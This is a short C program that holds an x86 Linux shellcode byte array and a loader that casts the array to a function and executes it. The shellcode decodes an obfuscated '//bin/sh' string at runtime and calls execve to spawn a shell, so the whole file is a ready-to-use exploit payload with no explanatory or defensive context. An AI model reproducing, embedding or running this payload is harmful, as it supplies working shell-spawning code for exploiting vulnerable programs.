#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = \
"\xeb\x3a\x8b\x34\x24\x5f\x6a\x01\x58\x48\x50\x89\xe2\x31\xc9\xb1\x07\x8b\x04\x0f\x48\x89\x04\x0f\xfe\xc9\x79\xf5\x31\xc0\x50\x83\xc4\x03\x8d\x76\x06\x33\x46\xfe\x50\x31\xc0\x33\x07\x50\x89\xe3\x31\xc0\x50\x8d\x3b\x57\x89\xe1\xb0\x0b\xcd\x80\xe8\xc1\xff\xff\xff\x30\x30\x63\x6a\x6f\x30\x74\x69";

void main()
{

	printf("Shellcode Length:  %d\n", strlen(shellcode));

	int (*ret)() = (int(*)())shellcode;

	ret();

}
